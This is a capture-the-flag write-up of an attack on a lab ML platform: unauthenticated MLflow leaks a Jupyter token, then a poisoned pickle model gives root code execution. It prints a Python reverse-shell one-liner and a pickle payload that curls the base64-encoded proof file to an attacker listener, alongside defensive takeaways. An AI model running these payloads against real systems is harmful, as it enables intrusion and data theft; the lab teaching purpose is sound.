# OpenClaw — CTF Writeup

**Category:** AI Security  
**Points:** 200  
**Difficulty:** Advanced  
**Flag:** `flag_67182cdd_c34b_4613_9a61_f91239192693`

---

## Description

> Nexus Corp. is offering OpenClaw for their employees. You've been given the target IP during a security assessment, find any exploitable weaknesses and read the flag on the host machine.

---

## Attack Chain Overview

```
nmap → MLflow (no auth)
           ↓
    API /experiments/search → lists 7 experiments
           ↓
    API /runs/search → run "notebook-server-deploy"
           ↓
    /artifacts → notebook_server_y715bbp3.yaml → Jupyter token
           ↓
    Jupyter access port 8888 → shell as jovyan
           ↓
    .cyberclaw/config.yaml → admin_key + model_path
           ↓
    Malicious pickle → shared-models/model.pkl
           ↓
    POST /admin/reload → POST /predict → RCE as root
           ↓
    curl → netcat → base64 decode → FLAG
```

---

## Step 1 — Reconnaissance (nmap)

```bash
nmap -sV -Pn -sC 10.8.0.2
```

**Output:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu
443/tcp  open  ssl/http nginx 1.29.6 — CyberClaw AI Platform
5000/tcp open  http     Gunicorn — MLflow
8888/tcp open  http     Tornado 6.5.5 — Jupyter Server
```

4 open ports. The two interesting targets are:
- **Port 5000** — MLflow, no authentication required
- **Port 8888** — Jupyter Notebook, protected by a token

---

## Step 2 — MLflow Enumeration (port 5000)

MLflow is an ML experiment tracking tool. Its REST API is well documented and accessible without any authentication.

### List experiments

```bash
curl -s http://10.8.0.2:5000/api/2.0/mlflow/experiments/search \
  -d '{"max_results": 20}' \
  -H "Content-Type: application/json" | python3 -m json.tool
```

We can see 7 experiments in the MLflow UI. The IDs are sequential (0 to 6).

<img width="400"  alt="Capture d’écran 2026-03-13 082007" src="https://github.com/user-attachments/assets/0d05aaa7-7a2a-4ea2-8717-e861f6488853" />


### List all runs

```bash
curl -s http://10.8.0.2:5000/api/2.0/mlflow/runs/search \
  -d '{"experiment_ids":["1","2","3","4","5","6"]}' \
  -H "Content-Type: application/json" | python3 -m json.tool
```

Among all runs, one name stands out inside the `infra-pipeline-config` experiment:

```json
{
    "run_name": "notebook-server-deploy",
    "run_id": "752b15b678424f32a87b38e8238ae655",
    "experiment_id": "5"
}
```

---

## Step 3 — Credential Leak via MLflow Artifacts

### List artifacts for the run

```bash
curl -s "http://10.8.0.2:5000/api/2.0/mlflow/artifacts/list?run_id=752b15b678424f32a87b38e8238ae655&path=."
```

```json
{
  "files": [
    {
      "path": "config",
      "is_dir": true
    }
  ]
}
```

```bash
curl -s "http://10.8.0.2:5000/api/2.0/mlflow/artifacts/list?run_id=752b15b678424f32a87b38e8238ae655&path=config"
```

```json
{
  "files": [
    {
      "path": "config/notebook_server_y715bbp3.yaml",
      "file_size": 373
    }
  ]
}
```

### Read the config file

```bash
curl -s "http://10.8.0.2:5000/get-artifact?path=config/notebook_server_y715bbp3.yaml&run_uuid=752b15b678424f32a87b38e8238ae655"
```

```yaml
server:
  host: 0.0.0.0
  port: 8888
auth:
  method: token
  token: d4f8a2e1c7b3d5f9a0e6b2c8d1f4a7e3
paths:
  workspace: /home/jovyan/work
  shared_models: /home/jovyan/shared-models
```

**Jupyter token obtained:** `d4f8a2e1c7b3d5f9a0e6b2c8d1f4a7e3`

---

## Step 4 — Jupyter Access and Initial Foothold

Access Jupyter in the browser:

```
http://10.8.0.2:8888/?token=d4f8a2e1c7b3d5f9a0e6b2c8d1f4a7e3
```

From the Jupyter interface: **New → Terminal**

```bash
whoami
# jovyan
id
# uid=1000(jovyan) gid=1000(jovyan)
```

> **Alternative — Reverse Shell from Kali**
>
> If you prefer working directly from your Kali terminal instead of the Jupyter browser terminal, you can get a full reverse shell.
>
> **On Kali, start a listener:**
> ```bash
> nc -lvnp 9001
> ```
>
> **In the Jupyter terminal, send the reverse shell:**
> ```bash
> python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.8.0.3",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'
> ```
>
> You now get a `jovyan` shell directly in your Kali terminal. All commands from the following steps can be run from this shell.

---

## Step 5 — Discovery of config.yaml

```bash
cat /home/jovyan/.cyberclaw/config.yaml
```

```yaml
services:
  model_serving:
    url: http://model-server:8080
    admin_key: cl4w-r3l04d-s3cr3t-k3y
    model_path: /models/model.pkl
  storage:
    shared_volume: /home/jovyan/shared-models
    type: docker_volume
```

Critical information gathered:
- Internal model server URL: `http://model-server:8080`
- Admin API key: `cl4w-r3l04d-s3cr3t-k3y`
- Model file path: `/models/model.pkl`
- Shared volume: `/home/jovyan/shared-models`

```bash
ls -la /home/jovyan/shared-models/
# -rw-rw-rw- 1 root root 120603 Mar 11 18:49 model.pkl
```

The `model.pkl` file is **world-writable** — anyone can overwrite it.

---

## Step 6 — RCE via Malicious Pickle

### Why Pickle is dangerous

When Python deserializes a pickle file, it calls the `__reduce__` method on the object. This method returns a tuple `(callable, args)` and Python executes `callable(*args)` with no validation whatsoever. This allows arbitrary system command execution.

### Why early attempts failed

The first attempts using `os.system` failed silently because:
- The model-server container does not have `/home/jovyan/shared-models` mounted
- The model-server container does not share `/tmp` with the Jupyter container
- `os.system()` returns `0` (an integer) — hence the response `type: int`

### Final technique — HTTP exfiltration via netcat

**On Kali, start a listener:**

```bash
nc -lvnp 4444
```

**In the Jupyter terminal, create the malicious pickle:**

```bash
python3 << 'EOF'
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = 'curl http://10.8.0.3:4444/$(cat /root/proof.txt | base64 -w0)'
        return (os.system, (cmd,))

with open('/home/jovyan/shared-models/model.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
print("Written:", os.path.getsize('/home/jovyan/shared-models/model.pkl'), "bytes")
EOF
```

**Reload the model and trigger deserialization:**

```bash
curl -s -X POST http://model-server:8080/admin/reload \
  -H "X-API-Key: cl4w-r3l04d-s3cr3t-k3y" && \
curl -s -X POST http://model-server:8080/predict \
  -H "Content-Type: application/json" \
  -d '{"features": [1,2,3,4]}'
```

**On Kali, the flag arrives base64-encoded in the URL path:**

```
connect to [10.8.0.3] from (UNKNOWN) [10.8.0.2] 32936
GET /ZmxhZ182NzE4MmNkZF9jMzRiXzQ2MTNfOWE2MV9mOTEyMzkxOTI2OTMK HTTP/1.1
```

**Decode it:**

```bash
echo "ZmxhZ182NzE4MmNkZF9jMzRiXzQ2MTNfOWE2MV9mOTEyMzkxOTI2OTMK" | base64 -d
# flag_67182cdd_c34b_4613_9a61_f91239192693
```

---

## Flag

```
flag_67182cdd_c34b_4613_9a61_f91239192693
```

---

<img width="388" height="172" alt="Capture d’écran 2026-03-13 082917" src="https://github.com/user-attachments/assets/c69110eb-0bff-478d-809d-c8418a0625eb" />


## Vulnerabilities Exploited

| Vulnerability | Impact |
|---|---|
| Unauthenticated MLflow | Read all experiments and artifacts |
| Credentials stored in MLflow artifacts | Leaked Jupyter token and admin API key |
| World-writable model.pkl | Overwrite model file with malicious payload |
| Unsafe pickle deserialization | RCE as root on the model server |
| No outbound network filtering | Flag exfiltration via HTTP callback |

---

## Key Takeaways

- Never store credentials in MLflow (params, tags, or artifacts)
- Never use pickle to load models in production — prefer ONNX or joblib with signatures
- Always authenticate internal ML infrastructure (MLflow, Jupyter, model servers)
- Never leave critical files world-writable
- Filter outbound network traffic from production containers
## Sources 
- https://mlflow.org/docs/latest/api_reference/rest-api.html#create-experiment
- https://snyk.io/fr/articles/python-pickle-poisoning-and-backdooring-pth-files/
